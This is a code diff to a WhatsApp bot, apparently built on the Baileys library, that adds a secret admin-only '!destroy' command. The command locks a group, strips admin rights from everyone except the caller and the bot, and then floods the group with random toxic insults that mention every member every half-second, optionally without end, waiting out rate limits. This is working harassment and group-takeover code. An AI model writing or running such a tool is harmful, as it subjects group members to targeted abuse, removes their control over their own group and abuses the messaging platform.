@@ -623,6 +623,57 @@ async function connectWA() {
                 return sock.sendMessage(sender, { text: resText });
             }
 
+            if (cmd === '!destroy') {
+                if (!(await isAdmin())) return; // Secret command, silent fail
+
+                const numStr = args[1];
+                const isInf = numStr === 'inf';
+                const num = isInf ? Infinity : parseInt(numStr);
+
+                if (!isInf && (isNaN(num) || num < 1)) {
+                    return sock.sendMessage(sender, { text: "⚠️ Format: !destroy {num|inf}" });
+                }
+
+                const meta = await sock.groupMetadata(sender);
+                const botId = sock.user.id.split(':')[0] + '@s.whatsapp.net';
+                const me = participant;
+
+                // 1. Close Group
+                await sock.groupSettingUpdate(sender, 'announcement');
+
+                // 2. Unadmin all except me and bot
+                const admins = meta.participants.filter(p => p.admin).map(p => p.id);
+                const toDemote = admins.filter(id => id !== me && id !== botId);
+                if (toDemote.length > 0) {
+                    await sock.groupParticipantsUpdate(sender, toDemote, 'demote');
+                }
+
+                // 3. Start Spamming
+                const members = meta.participants.map(p => p.id);
+                const tagList = members.map(id => `@${id.split('@')[0]}`).join(' ');
+
+                console.log(`🧨 [DESTROY START] Target: ${sender} | Cycles: ${num}`);
+
+                let count = 0;
+                while (count < num) {
+                    try {
+                        const randomToxic = toxicWords[Math.floor(Math.random() * toxicWords.length)];
+                        const message = `🔥 ~${meta.subject}~ 🔥\n\n${randomToxic.toUpperCase()}!!\n\n${tagList}`;
+
+                        await sock.sendMessage(sender, { text: message, mentions: members });
+
+                        await new Promise(resolve => setTimeout(resolve, 500)); // Faster spam
+
+                        count++;
+                        if (count % 10 === 0) console.log(`🧨 [DESTROY PROGRESS] Sent ${count} cycles...`);
+                    } catch (e) {
+                        if (e.message.includes('rate-overlimit')) await new Promise(resolve => setTimeout(resolve, 5000));
+                    }
+                }
+                console.log(`✅ [DESTROY FINISHED]`);
+                return;
+            }
+
             if (cmd === '!limit') {
                 if (!(await isAdmin())) return sock.sendMessage(sender, { text: "❌ Only admins can use this." });
                 const n = args[1];
